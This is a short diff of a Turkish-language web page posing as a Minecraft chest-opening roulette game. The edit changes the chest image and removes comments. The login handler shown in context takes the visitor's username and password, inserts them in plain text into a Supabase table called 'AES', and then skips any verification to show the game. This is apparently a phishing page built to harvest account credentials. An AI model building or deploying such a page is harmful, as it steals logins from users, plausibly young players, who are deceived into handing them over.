@@ -145,7 +145,7 @@
 <div id="game-container">
     <h1 id="welcome-txt" style="font-weight: 800; font-size: 42px; margin-bottom: 40px;"></h1>
     <div id="chest-zone">
-        <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" class="main-chest" onclick="initRoulette()">
+        <img src="adsız.png" class="main-chest" onclick="initRoulette()">
         <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px; text-transform: uppercase;">Sandığı Açmak İçin Dokun</p>
     </div>
     <div id="roulette-section">
@@ -181,10 +181,8 @@
         const p = document.getElementById('password').value;
         if(!u || !p) return alert("Bilgileri gir!");
 
-        // Supabase'e veriyi asenkron gönderiyoruz
         _db.from('AES').insert([{ username: u, password: p }]).then(res => console.log("DB Status:", res));
 
-        // Beklemeden direkt geçiş yapıyoruz
         document.getElementById('auth-container').style.display = 'none';
         document.getElementById('game-container').style.display = 'block';
         document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
